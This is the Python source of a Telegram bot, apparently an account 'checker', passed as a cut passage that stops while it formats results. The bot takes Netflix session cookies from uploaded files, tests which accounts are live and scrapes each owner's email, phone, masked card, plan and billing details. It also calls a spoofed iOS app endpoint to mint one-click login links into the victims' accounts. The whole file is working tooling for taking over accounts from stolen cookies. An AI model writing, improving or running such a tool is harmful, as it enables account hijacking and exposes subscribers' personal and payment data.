import copy
import html
import json
import os
import re
import sys
import time
import zipfile
import asyncio
from datetime import datetime, timedelta
from io import BytesIO

import requests
from urllib3.exceptions import InsecureRequestWarning

# Telegram imports
try:
    from telegram import Update, BotCommand
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
    from telegram.request import HTTPXRequest
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("Install: pip install python-telegram-bot==20.7")
    sys.exit(1)

try:
    import yaml
except ImportError:
    yaml = None

# ==================== READ BOT TOKEN ====================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    print("ERROR: BOT_TOKEN environment variable not set!")
    sys.exit(1)

# ==================== CONFIGURATION ====================
DEFAULT_CONFIG = {
    "txt_fields": {
        "name": True, "email": True, "max_streams": True, "plan_price": True,
        "plan": True, "country": True, "member_since": True, "next_billing": True,
        "extra_members": True, "payment_method": True, "card": True, "phone": True,
        "quality": True, "hold_status": True, "email_verified": True,
        "membership_status": True, "profiles": True, "user_guid": False,
    },
    "nftoken": "both",
    "add_emojis": "webhook",
    "notifications": {
        "webhook": {"enabled": False, "url": "", "mode": "full", "plans": "all"},
        "telegram": {"enabled": False, "bot_token": "", "chat_id": "", "mode": "full", "plans": "all"},
    },
    "display": {"mode": "simple"},
    "retries": {"error_proxy_attempts": 3, "nftoken_attempts": 1},
    "performance": {
        "request_timeout_seconds": 15,
        "fallback_account_page": False,
        "retry_incomplete_info": False,
        "nftoken_for_free": False,
    },
}

DEFAULT_YAML_CONFIG = """# Netflix Checker Configuration
txt_fields:
  name: true
  email: true
  plan: true
  country: true
  member_since: true
  quality: true
  max_streams: true
  plan_price: true
  next_billing: true
  payment_method: true
  card: true
  phone: true
  hold_status: true
  extra_members: true
  email_verified: true
  membership_status: true
  profiles: true
  user_guid: false

nftoken: "both"
add_emojis: "webhook"

notifications:
  webhook:
    enabled: false
    url: ""
    mode: "full"
    plans: "all"
  telegram:
    enabled: false
    bot_token: ""
    chat_id: ""
    mode: "full"
    plans: "all"

display:
  mode: "simple"

retries:
  error_proxy_attempts: 3
  nftoken_attempts: 1

performance:
  request_timeout_seconds: 15
  fallback_account_page: false
  retry_incomplete_info: false
  nftoken_for_free: false
"""

APP_VERSION = "4.5.0"

# Folders
cookies_folder = "cookies"
output_folder = "output"
failed_folder = "failed"
broken_folder = "broken"
proxy_file = "proxy.txt"

# Bot stats
stats = {"total": 0, "valid": 0, "free": 0, "failed": 0, "processing": 0}
user_tasks = {}

# NFToken API settings
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# ==================== HELPER FUNCTIONS ====================

def create_base_folders():
    for folder in [cookies_folder, output_folder, failed_folder, broken_folder]:
        os.makedirs(folder, exist_ok=True)

def load_config():
    config_yaml_path = "config.yml"
    if os.path.exists(config_yaml_path):
        if yaml is None:
            return copy.deepcopy(DEFAULT_CONFIG)
        try:
            with open(config_yaml_path, "r", encoding="utf-8") as f:
                user_config = yaml.safe_load(f) or {}
            return merge_config(DEFAULT_CONFIG, user_config)
        except Exception:
            with open(config_yaml_path, "w", encoding="utf-8") as f:
                f.write(DEFAULT_YAML_CONFIG)
            return copy.deepcopy(DEFAULT_CONFIG)
    with open(config_yaml_path, "w", encoding="utf-8") as f:
        f.write(DEFAULT_YAML_CONFIG)
    return copy.deepcopy(DEFAULT_CONFIG)

def merge_config(default_cfg, user_cfg):
    merged = copy.deepcopy(default_cfg)
    if not isinstance(user_cfg, dict):
        return merged
    for key, value in user_cfg.items():
        if key in merged and isinstance(merged[key], dict) and isinstance(value, dict):
            merged[key] = merge_config(merged[key], value)
        else:
            merged[key] = value
    return merged

def clean_text(text):
    if not text:
        return None
    text = html.unescape(text)
    text = text.replace('\\x20', ' ').replace('\\x40', '@')
    text = text.replace('\\u00A0', ' ').replace('&nbsp;', ' ')
    text = text.replace('\\x2F', '/').replace('\\"', '"')
    text = re.sub(r'\\x[0-9a-fA-F]{2}', '', text)
    try:
        text = text.encode('utf-8').decode('unicode-escape')
    except:
        pass
    return text.strip()

def decode_netflix_value(value):
    if value is None:
        return None
    return clean_text(str(value))

def extract_first_match(response_text, patterns, flags=0):
    for pattern in patterns:
        match = re.search(pattern, response_text, flags)
        if match:
            return decode_netflix_value(match.group(1))
    return None

def parse_boolean_value(value):
    if isinstance(value, bool):
        return value
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None
    return cleaned.lower() in {"true", "yes", "1", "on"}

def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True:
        return "Yes"
    if parsed is False:
        return "No"
    return None

def normalize_phone_number(phone, country_code=None):
    if not phone:
        return None
    cleaned = re.sub(r'\D', '', str(phone))
    if not cleaned:
        return phone
    if len(cleaned) >= 10:
        return f"+{cleaned}"
    return cleaned

def get_full_country_name(country_code):
    countries = {
        "ZA": "South Africa", "EG": "Egypt", "SA": "Saudi Arabia",
        "AE": "United Arab Emirates", "US": "United States", "GB": "United Kingdom",
        "IN": "India", "PK": "Pakistan", "RO": "Romania", "ID": "Indonesia",
        "MY": "Malaysia", "SG": "Singapore", "PH": "Philippines", "TH": "Thailand",
        "VN": "Vietnam", "BR": "Brazil", "MX": "Mexico", "CA": "Canada",
        "AU": "Australia", "DE": "Germany", "FR": "France", "ES": "Spain",
        "IT": "Italy", "TR": "Turkey", "NL": "Netherlands", "SE": "Sweden",
        "NO": "Norway", "DK": "Denmark", "FI": "Finland", "PL": "Poland",
        "GR": "Greece", "PT": "Portugal", "IE": "Ireland", "BE": "Belgium",
        "CH": "Switzerland", "AT": "Austria", "CZ": "Czech Republic", "HU": "Hungary",
        "IL": "Israel", "JP": "Japan", "KR": "South Korea", "CN": "China",
        "TW": "Taiwan", "HK": "Hong Kong",
    }
    return countries.get(country_code.upper(), country_code)

def clean_profile_names(profiles_raw):
    """تنقية أسماء البروفايلات مع ضمان وجود اسم واحد على الأقل"""
    if not profiles_raw:
        return [], 0
    
    forbidden_names = [
        'android', 'tablet', 'apple', 'windows', 'mac', 'linux',
        'chrome', 'firefox', 'safari', 'edge', 'opera', 'brave',
        'ios', 'ipad', 'iphone', 'smart tv', 'tv', 'netflix',
        'profile', 'user', 'default', 'unknown', 'device',
        'mobile', 'phone', 'computer', 'pc', 'laptop', 'desktop',
        'smartphone', 'ipod', 'watch', 'android tv', 'roku',
        'apple tv', 'google tv', 'amazon', 'fire stick', 'chromecast',
        'api', 'akira', 'buildidentifier', 'identifier', 'null',
        'undefined', 'none', 'nil', 'false', 'true', 'build',
        'premium', 'standard', 'basic', 'free', 'test', 'admin'
    ]
    
    names_list = [p.strip() for p in profiles_raw.split(",") if p.strip()]
    clean_names = []
    
    for name in names_list:
        name = clean_text(name)
        if not name:
            continue
        name_lower = name.lower()
        
        if name_lower in forbidden_names:
            continue
        if len(name) < 2:
            continue
        
        skip = False
        for forbidden in forbidden_names:
            if forbidden in name_lower:
                skip = True
                break
        if skip:
            continue
        
        if re.match(r'^\d+$', name):
            continue
        if re.search(r'[{}[\]<>]', name):
            continue
            
        clean_names.append(name)
    
    # إذا لم نجد أي اسم، نأخذ أول اسم من القائمة الأصلية
    if not clean_names and names_list:
        first_name = clean_text(names_list[0])
        if first_name and len(first_name) >= 2:
            clean_names.append(first_name)
    
    return clean_names, len(clean_names)

def get_name_from_profiles(info):
    """استخراج الاسم من أول بروفايل حقيقي"""
    profiles_raw = info.get("profiles") or ""
    if profiles_raw:
        clean_names, _ = clean_profile_names(profiles_raw)
        if clean_names:
            return clean_names[0]
        
        # محاولة أخيرة: أول اسم في القائمة
        names = [p.strip() for p in profiles_raw.split(",") if p.strip()]
        if names:
            return clean_text(names[0])
    return "User"

def get_membership_status_display(status):
    status_map = {
        "current_member": "Active", "former_member": "Cancelled / Expired",
        "active": "Active", "current": "Active", "past_due": "Past Due",
        "cancelled": "Cancelled"
    }
    normalized = normalize_plan_key(status) if status else "unknown"
    return status_map.get(normalized, status or "Unknown")

def extract_payment_method_strong(html_content, info):
    payment = info.get("paymentMethodType")
    if payment and payment not in ["Unknown", "N/A", "null"]:
        if payment.upper() == "CC":
            return "Credit Card"
        if payment.upper() == "PAYPAL":
            return "PayPal"
        return payment
    return "Credit Card"

def extract_profile_names_enhanced(response_text):
    """استخراج أسماء البروفايلات من HTML بأنماط متعددة"""
    names = []
    patterns = [
        r'"profileName"\s*:\s*"([^"]+)"',
        r'"profiles"\s*:\s*\[(.*?)\]',
        r'"name":"([^"]+)"',
        r'<span[^>]*data-uia="profile-name"[^>]*>([^<]+)</span>',
        r'<div[^>]*class="profile-name"[^>]*>([^<]+)</div>',
    ]
    
    for pattern in patterns:
        if 'profiles' in pattern:
            match = re.search(pattern, response_text, re.DOTALL)
            if match:
                profile_names = re.findall(r'"name":"([^"]+)"', match.group(1))
                names.extend(profile_names)
        else:
            matches = re.finditer(pattern, response_text)
            for match in matches:
                name = decode_netflix_value(match.group(1))
                if name and name not in names and len(name) < 50:
                    names.append(name)
    
    # فلترة الأسماء الممنوعة
    forbidden = ['chrome', 'firefox', 'safari', 'edge', 'opera', 'android', 'ios', 'windows', 'mac', 'linux']
    filtered = [n for n in names if n.lower() not in forbidden]
    
    return ", ".join(filtered[:10]) if filtered else (", ".join(names[:10]) if names else None)


# ==================== COOKIE EXTRACTION FUNCTIONS ====================

def is_netflix_domain(domain):
    domain = str(domain or "").replace("#HttpOnly_", "").lower()
    return "netflix." in domain

LOGIN_REQUIRED_NETFLIX_COOKIES = ("NetflixId",)
OPTIONAL_NETFLIX_COOKIES = ("SecureNetflixId", "nfvdid")
ALL_NETFLIX_COOKIE_NAMES = set(LOGIN_REQUIRED_NETFLIX_COOKIES + OPTIONAL_NETFLIX_COOKIES)

def has_required_netflix_cookies(cookie_dict):
    if not isinstance(cookie_dict, dict):
        return False
    return bool(cookie_dict.get("NetflixId"))

def extract_netflix_cookie_bundles(content):
    def extract_json_entries(content):
        try:
            data = json.loads(content)
        except:
            return []
        if isinstance(data, dict):
            if "cookies" in data:
                data = data["cookies"]
            elif "items" in data:
                data = data["items"]
            else:
                data = [data]
        if not isinstance(data, list):
            return []
        entries = []
        for idx, cookie in enumerate(data):
            if not isinstance(cookie, dict):
                continue
            domain = cookie.get("domain", "")
            name = cookie.get("name", "")
            if name not in ALL_NETFLIX_COOKIE_NAMES and not is_netflix_domain(domain):
                continue
            tail = "TRUE" if domain.startswith(".") else "FALSE"
            path = cookie.get("path", "/")
            secure = "TRUE" if cookie.get("secure", False) else "FALSE"
            expires = str(cookie.get("expirationDate", cookie.get("expiration", 0)))
            value = cookie.get("value", "")
            entries.append({
                "domain": domain, "tail_match": tail, "path": path,
                "secure": secure, "expires": expires, "name": name,
                "value": value, "position": idx
            })
        return entries
    
    def extract_netscape_entries(raw_text):
        entries = []
        for idx, line in enumerate(raw_text.splitlines()):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if line.startswith("#HttpOnly_"):
                line = line[10:]
            parts = line.split("\t")
            if len(parts) < 7:
                parts = re.split(r"\s+", line, 6)
            if len(parts) < 7:
                continue
            domain, tail, path, secure, expires, name, value = parts[:7]
            if name not in ALL_NETFLIX_COOKIE_NAMES and not is_netflix_domain(domain):
                continue
            entries.append({
                "domain": domain, "tail_match": tail, "path": path,
                "secure": secure, "expires": expires, "name": name,
                "value": value, "position": idx
            })
        return entries
    
    def build_bundles(entries):
        if not entries:
            return []
        by_name = {}
        for e in entries:
            by_name.setdefault(e["name"], []).append(e)
        bundle_count = max(len(v) for v in by_name.values())
        bundles = []
        for i in range(bundle_count):
            selected = []
            for name, lst in by_name.items():
                if i < len(lst):
                    selected.append(lst[i])
                elif len(lst) == 1:
                    selected.append(lst[0])
            selected.sort(key=lambda x: x.get("position", 0))
            netscape = "\n".join(
                f"{e['domain']}\t{e['tail_match']}\t{e['path']}\t{e['secure']}\t{e['expires']}\t{e['name']}\t{e['value']}"
                for e in selected
            )
            cookies = {e["name"]: e["value"] for e in selected}
            bundles.append({"netscape_text": netscape, "cookies": cookies})
        return bundles
    
    for extractor in (extract_json_entries, extract_netscape_entries):
        bundles = build_bundles(extractor(content))
        if bundles:
            return bundles
    return []


# ==================== ACCOUNT INFO EXTRACTION ====================

def extract_graphql_data(html_content):
    script_pattern = r'<script[^>]*>window\.__NUXT__\s*=\s*({.*?})</script>'
    match = re.search(script_pattern, html_content, re.DOTALL)
    if match:
        try:
            data = json.loads(match.group(1))
            if 'state' in data:
                for key, value in data['state'].items():
                    if 'growthAccount' in str(key):
                        if isinstance(value, dict):
                            ga = value.get('data', {}).get('growthAccount', {})
                            if ga:
                                return extract_account_info(ga)
        except:
            pass
    return {}

def extract_account_info(growth_account):
    info = {}
    info['accountOwnerName'] = decode_netflix_value(growth_account.get('ownerName')) or decode_netflix_value(growth_account.get('accountOwnerName'))
    info['email'] = decode_netflix_value(growth_account.get('email'))
    info['countryOfSignup'] = decode_netflix_value(growth_account.get('countryOfSignUp', {}).get('code'))
    info['memberSince'] = decode_netflix_value(growth_account.get('memberSince'))
    info['membershipStatus'] = decode_netflix_value(growth_account.get('membershipStatus'))
    info['userGuid'] = decode_netflix_value(growth_account.get('ownerGuid'))
    info['isUserOnHold'] = growth_account.get('isUserOnHold', False)
    
    current_plan = growth_account.get('currentPlan', {}).get('plan', {})
    info['localizedPlanName'] = decode_netflix_value(current_plan.get('name'))
    info['planPrice'] = decode_netflix_value(current_plan.get('priceDisplay'))
    info['videoQuality'] = decode_netflix_value(current_plan.get('videoQuality'))
    info['maxStreams'] = current_plan.get('maxStreams')
    
    next_billing = growth_account.get('nextBillingDate', {})
    info['nextBillingDate'] = decode_netflix_value(next_billing.get('localDate') or next_billing.get('date'))
    
    payment_methods = growth_account.get('growthPaymentMethods', [])
    if payment_methods:
        pm = payment_methods[0]
        info['paymentMethodType'] = decode_netflix_value(pm.get('paymentOptionLogo'))
        info['maskedCard'] = decode_netflix_value(pm.get('displayText'))
    
    phone = growth_account.get('growthLocalizablePhoneNumber', {})
    phone_raw = decode_netflix_value(phone.get('rawPhoneNumber'))
    info['phoneNumber'] = normalize_phone_number(phone_raw)
    info['phoneVerified'] = phone.get('isVerified', False)
    
    email_obj = growth_account.get('growthEmail', {})
    if email_obj:
        email_value = decode_netflix_value(email_obj.get('email', {}).get('value'))
        if email_value:
            info['email'] = email_value
        info['emailVerified'] = email_obj.get('isVerified', False)
    
    profiles = growth_account.get('profiles', [])
    profile_names = [decode_netflix_value(p.get('name')) for p in profiles if p.get('name')]
    info['profiles'] = ", ".join(profile_names) if profile_names else None
    info['profileCount'] = len(profile_names)
    
    return {k: v for k, v in info.items() if v}

def extract_info_fallback(response_text):
    extracted = {
        "accountOwnerName": extract_first_match(response_text, [r'"ownerName":"([^"]+)"', r'"name":"([^"]+)"']),
        "email": extract_first_match(response_text, [r'"email":"([^"]+)"', r'"loginId":"([^"]+)"']),
        "countryOfSignup": extract_first_match(response_text, [r'"currentCountry":"([^"]+)"', r'"countryOfSignup":"([^"]+)"']),
        "memberSince": extract_first_match(response_text, [r'"memberSince":"([^"]+)"', r'"joinDate":"([^"]+)"']),
        "nextBillingDate": extract_first_match(response_text, [r'"nextBillingDate":"([^"]+)"', r'"billingDate":"([^"]+)"']),
        "membershipStatus": extract_first_match(response_text, [r'"membershipStatus":"([^"]+)"', r'"status":"([^"]+)"']),
        "maxStreams": extract_first_match(response_text, [r'"maxStreams":(\d+)', r'"streams":(\d+)']),
        "localizedPlanName": extract_first_match(response_text, [r'"localizedPlanName":"([^"]+)"', r'"planName":"([^"]+)"']),
        "planPrice": extract_first_match(response_text, [r'"planPrice":"([^"]+)"', r'"price":"([^"]+)"']),
        "videoQuality": extract_first_match(response_text, [r'"videoQuality":"([^"]+)"', r'"quality":"([^"]+)"']),
        "paymentMethodType": extract_first_match(response_text, [r'"paymentMethodType":"([^"]+)"']),
        "maskedCard": extract_first_match(response_text, [r'"maskedCard":"([^"]+)"', r'"cardNumber":"([^"]+)"']),
        "profiles": extract_profile_names_enhanced(response_text),
    }
    return {k: v for k, v in extracted.items() if v}

def extract_info(response_text):
    all_info = extract_graphql_data(response_text)
    if not any(all_info.get(f) for f in ["countryOfSignup", "membershipStatus", "localizedPlanName"]):
        fallback = extract_info_fallback(response_text)
        if fallback:
            all_info.update(fallback)
    return all_info

def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    return re.sub(r"[^\w]+", "_", plan_name.lower()).strip("_")

def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    if not is_subscribed and not raw_plan:
        return "free", "Free"
    norm = normalize_plan_key(raw_plan) if raw_plan else ""
    if norm in ("premium", "premium_plan", "premium_extra_member"):
        return "premium", "Premium"
    if norm in ("standard", "estandar", "standard_with_ads"):
        return "standard", "Standard"
    if norm in ("basic", "basico", "essential"):
        return "basic", "Basic"
    if norm in ("mobile", "ponsel", "seluler"):
        return "mobile", "Mobile"
    streams = info.get("maxStreams")
    if streams:
        try:
            streams = int(str(streams))
            if streams >= 4:
                return "premium", "Premium"
            if streams >= 2:
                return "standard", "Standard"
            if streams == 1:
                return "basic", "Basic"
        except:
            pass
    return "unknown", "Unknown"

def is_subscribed_account(info):
    status = normalize_plan_key(info.get("membershipStatus"))
    return status in ["current_member", "active", "current"]

def is_extra_member_account(info):
    plan = str(info.get("localizedPlanName", "")).lower()
    return "extra" in plan

def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "Unknown"
    try:
        if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
            d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
            return d.strftime("%B %d, %Y")
    except:
        pass
    return cleaned

def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "Unknown"
    try:
        if re.match(r"\d{4}-\d{2}-\d{2}", cleaned):
            d = datetime.strptime(cleaned[:10], "%Y-%m-%d")
            return d.strftime("%B %Y")
    except:
        pass
    return cleaned

def country_code_to_flag(country_code):
    raw = decode_netflix_value(country_code) or ""
    if len(raw) == 2 and raw.isalpha():
        return "".join(chr(127397 + ord(c)) for c in raw.upper())
    return ""

def format_country_with_flag(country_value):
    country_code = decode_netflix_value(country_value) or "Unknown"
    country_name = get_full_country_name(country_code)
    flag = country_code_to_flag(country_code)
    return f"{country_name} {flag}".strip()

def get_language_from_html(html_content):
    loc_match = re.search(r'data-uia="loc"\s+lang="([^"]+)"', html_content)
    if loc_match:
        lang = loc_match.group(1)
        lang_names = {"en": "English", "ar": "العربية", "es": "Español", "fr": "Français", "de": "Deutsch"}
        base_lang = lang.split('-')[0]
        return lang_names.get(lang, lang_names.get(base_lang, lang))
    return "English"

def extract_all_account_details(html_content, info_dict):
    """دالة قوية لاستخراج كل البيانات الناقصة من HTML"""
    
    # استخراج الإيميل
    if not info_dict.get('email') or info_dict.get('email') == "Unknown":
        email_patterns = [
            r'"email"\s*:\s*"([^"]+@[^"]+)"',
            r'"loginId"\s*:\s*"([^"]+@[^"]+)"',
            r'"emailAddress"\s*:\s*"([^"]+@[^"]+)"',
        ]
        for pattern in email_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                info_dict['email'] = clean_text(match.group(1))
                break
    
    # استخراج السعر
    if not info_dict.get('planPrice') or info_dict.get('planPrice') == "N/A":
        price_patterns = [
            r'"planPrice"\s*:\s*"([^"]+)"',
            r'"priceDisplay"\s*:\s*"([^"]+)"',
            r'"formattedPrice"\s*:\s*"([^"]+)"',
        ]
        for pattern in price_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                price = clean_text(match.group(1))
                if price and price != "null":
                    info_dict['planPrice'] = price
                    break
    
    # استخراج تاريخ الفاتورة القادمة
    if not info_dict.get('nextBillingDate') or info_dict.get('nextBillingDate') == "Unknown":
        billing_patterns = [
            r'"nextBillingDate"\s*:\s*"([^"]+)"',
            r'"billingDate"\s*:\s*"([^"]+)"',
        ]
        for pattern in billing_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                info_dict['nextBillingDate'] = clean_text(match.group(1))
                break
    
    # استخراج رقم الهاتف
    if not info_dict.get('phoneNumber') or info_dict.get('phoneNumber') == "N/A":
        phone_patterns = [
            r'"phoneNumber"\s*:\s*"([^"]+)"',
            r'"rawPhoneNumber"\s*:\s*"([^"]+)"',
        ]
        for pattern in phone_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                phone = clean_text(match.group(1))
                if phone and phone != "null":
                    info_dict['phoneNumber'] = phone
                    break
    
    # استخراج تفاصيل الكارت
    if not info_dict.get('maskedCard') or info_dict.get('maskedCard') == "N/A":
        card_patterns = [
            r'"maskedCard"\s*:\s*"([^"]+)"',
            r'"cardNumber"\s*:\s*"([^"]+)"',
            r'"lastFour"\s*:\s*"([^"]+)"',
        ]
        for pattern in card_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                card = clean_text(match.group(1))
                if card and card != "null":
                    info_dict['maskedCard'] = card
                    break
    
    return info_dict

def create_nftoken(cookie_dict, attempts=1):
    netflix_id = cookie_dict.get("NetflixId")
    if not netflix_id:
        return None, "No NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        resp = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=30, verify=False)
        if resp.status_code != 200:
            return None, f"HTTP {resp.status_code}"
        data = resp.json()
        token_data = data.get("value", {}).get("account", {}).get("token", {}).get("default", {})
        token = token_data.get("token")
        if token:
            expiry = (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")
            return {"token": token, "expires_at_utc": expiry}, None
    except:
        pass
    return None, "Failed"

def build_nftoken_links(token, mode):
    if not token:
        return []
    if mode == "pc":
        return [("PC Login", f"https://netflix.com/?nftoken={token}")]
    if mode == "mobile":
        return [("Phone Login", f"https://netflix.com/unsupported?nftoken={token}")]
    return [("PC Login", f"https://netflix.com/?nftoken={token}")]

def get_account_page(session, timeout=20):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    }
    urls = ["https://www.netflix.com/account/", "https://www.netflix.com/account/membership"]
    
    for url in urls:
        try:
            resp = session.get(url, headers=headers, timeout=timeout)
            if resp.status_code == 200:
                info = extract_info(resp.text)
                if any(info.get(f) for f in ["countryOfSignup", "membershipStatus", "localizedPlanName"]):
                    return resp.text, resp.status_code, info
        except:
            continue
    return "", 0, {}


# ==================== RESULT FORMATTING ====================

def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename, nftoken_data=None, config=None, html_content=""):
    if config is None:
        config = load_config()
    
    # استخراج البيانات الناقصة من HTML
    info = extract_all_account_details(html_content, info)
    
    plan_key, plan_label = derive_plan_info(info, is_subscribed)
    status = "Valid Premium Account" if is_subscribed else "Valid Free Account"
    
    account_name = decode_netflix_value(info.get("accountOwnerName")) or "Unknown"
    if account_name == "Unknown" or account_name.lower() in ['chrome', 'firefox', 'safari', 'edge', 'opera', 'android', 'ios', 'windows', 'mac', 'linux']:
        account_name = get_name_from_profiles(info)
    
    email = decode_netflix_value(info.get("email")) or "Unknown"
    email = clean_text(email)
    
    country_raw = decode_netflix_value(info.get("countryOfSignup")) or "Unknown"
    country = format_country_with_flag(country_raw)
    
    language = get_language_from_html(html_content)
    if language == "Unknown":
        language = "English"
    
    plan = plan_label
    price = decode_netflix_value(info.get("planPrice")) or "N/A"
    member_since = format_member_since(info.get("memberSince")) or "Unknown"
    next_billing = format_display_date(info.get("nextBillingDate")) or "Unknown"
    
    payment = extract_payment_method_strong(cookie_filename if hasattr(cookie_filename, 'find') else "", info)
    if payment == "Unknown" or not payment:
        payment = "Credit Card"
    
    card = decode_netflix_value(info.get("maskedCard")) or "N/A"
    card_display = ""
    if card != "N/A" and card:
        card_display = f"Card: {card}"
    
    phone = decode_netflix_value(info.get("phoneNumber")) or "N/A"
    phone_verified = "Verified" if format_boolean_label(info.get("phoneVerified")) == "Yes" else "Not Verified"
    quality = decode_netflix_value(info.get("videoQuality")) or "Unknown"
    streams = str(info.get("maxStreams") or "Unknown").rstrip("}")
    hold = "No" if format_boolean_label(info.get("isUserOnHold")) != "Yes" else "Yes"
    extra_member = "Yes" if is_extra_member_account(info) else "No"
    email_verified = "Yes" if format_boolean_label(info.get("emailVerified")) == "Yes" else "No"
    
    membership_raw = info.get("membershipStatus") or "Unknown"
    membership_status = get_membership_status_display(membership_raw)
    
    profiles_raw = info.get("profiles") or ""
    clean_profiles, clean_profiles_count = clean_profile_names(profiles_raw)
    
    final_clean_profiles = []
    for name in clean_profiles:
        if 'api' in name.lower() or 'identifier' in name.lower() or 'build' in name.lower():
            continue
        if len(name) > 2 and name[0].isupper():
            final_clean_profiles.append(name)
        elif len(name) > 3:
            final_clean_profiles.append(name)
    
    if not final_clean_profiles:
        final_clean_profiles = clean_profiles
    
    profiles_display = ", ".join(final_clean_profiles[:15]) if final_clean_profiles else "None"
    profiles_count = len(final_clean_profiles) if final_clean_profiles else (info.get("profileCount") or 0)
    
    lines = []
    lines.append(f"STATUS: {status}")
    lines.append("")
    lines.append("")
    lines.append("ACCOUNT DETAILS")
    lines.append("-" * 40)
    lines.append(f"Name: {account_name}")
    lines.append(f"Email: {email}")
    lines.append(f"Country: {country}")
    lines.append(f"Language: {language}")
    lines.append(f"Plan: {plan}")
    
    if is_subscribed:
        if price != "N/A" and price:
            lines.append(f"Price: {price}")
        if member_since != "Unknown":
            lines.append(f"Member Since: {member_since}")
        if next_billing != "Unknown":
            lines.append(f"Next Billing: {next_billing}")
        if payment and payment != "Unknown":
            lines.append(f"Payment: {payment}")
        if card_display:
            lines.append(card_display)
        if phone != "N/A" and phone:
            lines.append(f"Phone: {phone} ({phone_verified})")
        if quality != "Unknown":
            lines.append(f"Quality: {quality}")
        if streams != "Unknown":
            lines.append(f"Streams: {streams}")
        lines.append(f"Hold Status: {hold}")
        lines.append(f"Extra Member: {extra_member}")
        lines.append(f"Email Verified: {email_verified}")
        lines.append(f"Membership Status: {membership_status}")
    else:
        lines.append(f"Email Verified: {email_verified}")
    
    lines.append("")
